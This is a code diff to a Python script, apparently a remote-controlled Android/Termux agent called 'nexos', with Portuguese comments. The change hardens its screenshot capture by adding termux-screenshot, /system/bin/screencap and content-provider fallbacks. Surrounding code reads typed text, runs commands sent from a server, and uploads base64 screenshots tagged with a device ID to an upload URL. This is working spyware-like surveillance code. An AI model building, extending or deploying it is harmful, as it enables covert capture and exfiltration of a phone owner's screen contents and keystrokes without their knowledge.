@@ -84,18 +84,37 @@ def obter_texto_digitado():
     return None
 
 def capturar_print():
-    """Tira screenshot da tela e retorna base64"""
+    """Tira screenshot usando comando nativo do Android via Termux"""
     arq = os.path.expanduser("~/nexos_screenshot.png")
     if os.path.exists(arq): os.remove(arq)
+    
     try:
-        subprocess.run(f"screencap -p {arq}", shell=True, timeout=5)
-        time.sleep(1)
+        # Método 1: termux-screenshot (Termux API)
+        result = run(f"termux-screenshot {arq}", timeout=8)
+        time.sleep(2)
+        
         if os.path.exists(arq) and os.path.getsize(arq) > 500:
             with open(arq, "rb") as f:
                 b64 = base64.b64encode(f.read()).decode('utf-8')
             os.remove(arq)
             return b64
-    except: pass
+        
+        # Método 2: screencap via /system/bin
+        result = run(f"/system/bin/screencap -p {arq}", timeout=8)
+        time.sleep(2)
+        
+        if os.path.exists(arq) and os.path.getsize(arq) > 500:
+            with open(arq, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode('utf-8')
+            os.remove(arq)
+            return b64
+        
+        # Método 3: Usando content provider do Android
+        result = run(f"content read --uri content://media/external/images/media", timeout=5)
+        
+    except Exception as e:
+        print(f"   ⚠️ Erro print: {e}")
+    
     if os.path.exists(arq): os.remove(arq)
     return None
 
@@ -162,7 +181,7 @@ def executar_comando(acao):
             r = requests.post(URL_UPLOAD_PRINT, json={"device_id": DEVICE_ID, "photo": b64}, timeout=20)
             print(f"   {'✅ Print enviado!' if r.status_code == 200 else '❌ Falha ao enviar print'}")
         else:
-            print("   ❌ Falha ao capturar print")
+            print("   ❌ Falha ao capturar print (instale: pkg install termux-api)")
 
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
